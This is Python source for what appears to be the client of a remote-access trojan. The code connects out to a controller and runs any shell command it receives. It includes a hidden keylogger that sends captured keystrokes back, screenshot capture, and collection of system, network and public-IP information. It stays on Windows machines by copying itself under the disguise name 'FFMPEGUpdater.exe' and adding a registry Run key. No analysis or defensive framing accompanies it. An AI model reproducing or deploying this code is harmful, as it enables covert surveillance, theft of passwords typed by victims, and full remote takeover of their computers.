class CLIENT:

    SOCK = None
    KEY = ")J@NcRfU"
    KEYLOGGER_STATUS = False
    KEYLOGGER_STROKES = ""

    def __init__(self, _ip, _pt):
        self.ipaddress = _ip
        self.port = _pt

    def send_data(self, tosend, encode=True):
        if encode:
            self.SOCK.send(base64.encodebytes(
                tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
        else:
            self.SOCK.send(base64.encodebytes(
                tosend) + self.KEY.encode('utf-8'))

    def turn_keylogger(self, status):
        def on_press(key):
            if not self.KEYLOGGER_STATUS:
                return False

            key = str(key)
            if len(key.strip('\'')) == 1:
                self.KEYLOGGER_STROKES += key.strip('\'')
            else:
                self.KEYLOGGER_STROKES += ("[" + key + "]")

        def on_release(key):
            if not self.KEYLOGGER_STATUS:
                return False

        def logger():
            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()

        if status:
            if not self.KEYLOGGER_STATUS:
                self.KEYLOGGER_STATUS = True
                t = threading.Thread(target=logger)
                t.daemon = True
                t.start()
        else:
            self.KEYLOGGER_STATUS = False

    def execute(self, command):
        data = command.decode('utf-8').split(":")

        if data[0] == "shell":
            toexecute = data[1].rstrip(" ").lstrip(" ")
            toexecute = " ".join(toexecute.split())
            if toexecute.split(" ")[0] == "cd":
                try:
                    os.chdir(toexecute.split(" ")[1])
                    self.send_data("")
                except:
                    self.send_data("Error while changing directory!")
            else:
                try:
                    comm = subprocess.Popen(
                        data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                    output, errors = comm.communicate()
                    self.send_data(output + errors)
                except FileNotFoundError:
                    self.send_data("No Such File or Directory")

        elif data[0] == "keylogger":
            if data[1] == "on":
                self.turn_keylogger(True)
                self.send_data("")
            elif data[1] == "off":
                self.turn_keylogger(False)
                self.send_data("")
            elif data[1] == "dump":
                self.send_data(self.KEYLOGGER_STROKES)

        elif data[0] == "sysinfo":
            sysinfo = SYSINFO()
            self.send_data(sysinfo.get_data())

        elif data[0] == "screenshot":
            screenshot = SCREENSHOT()
            self.send_data(screenshot.get_data(), encode=False)

        elif data[0] == "networkinfo":
            try:
                adapters = ifaddr.get_adapters()
                msg = ""
                for adapter in adapters:
                    title = str("\nNetwork adapter name: '" +
                                adapter.nice_name + "':\n")
                    msg += title
                    for ip in adapter.ips:
                        desc = str("   IP: %s/%s" % (ip.ip, ip.network_prefix))
                        msg += desc
                msg += "\n"
                self.send_data(msg)
            except:
                msg = "- Could not get network adapters"
                self.send_data(msg)

        elif data[0] == "publicip":
            try:
                ip = requests.get('https://api.ipify.org').text
                msg = f"+ PUBLIC IP: {ip}\n"
                self.send_data(msg)
            except:
                msg = "- Could not get Public IP"
                self.send_data(msg)

        elif data[0] == "startup":
            location = os.environ["appdata"] + "\\FFMPEGUpdater.exe"
            if not os.path.exists(location):
                shutil.copyfile(sys.executable, location)
                subprocess.call(
                    'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v FFMPEGUpdater /t REG_SZ /d "' + location + '"', shell=True)

    def acceptor(self):
        data = ""
        chunk = b""

        while True:
            chunk = self.SOCK.recv(4096)
            if not chunk:
                break
            data += chunk.decode('utf-8')

            if self.KEY.encode('utf-8') in chunk:
                data = data.rstrip(self.KEY)
                t = threading.Thread(target=self.execute, args=(
                    base64.decodebytes(data.encode('utf-8')),))
                t.daemon = True
                t.start()
                data = ""

    def engage(self):
        self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:
            try:
                print("Connecting To: %s:%d" % (self.ipaddress, self.port))
                self.SOCK.connect((self.ipaddress, self.port))
            except:
                print("Failed to Connect. Trying Again!")
                time.sleep(5)
                continue

            self.acceptor()
